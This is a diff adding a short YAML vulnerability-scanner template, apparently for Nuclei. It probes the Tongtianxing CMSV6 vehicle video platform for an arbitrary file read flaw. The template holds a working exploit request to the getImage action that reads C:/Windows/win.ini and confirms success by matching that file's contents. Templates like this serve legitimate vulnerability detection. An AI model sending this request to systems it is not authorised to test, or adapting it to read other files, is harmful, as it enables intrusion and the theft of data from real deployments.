@@ -1,0 +1,24 @@
+id: poc-yaml-tongtianxing-cmsv6-getimage-file-read
+info:
+  name: 通天星CMSV6车载视频监控平台 getImage 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  metadata:
+    fingerprint: cmsv6
+
+http:
+  - method: GET
+    path:
+      - "/808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "for 16-bit app support"
+          - "[fonts]"
+          - "[Mail]"
+        part: body
+      - type: status
+        status:
+          - 200
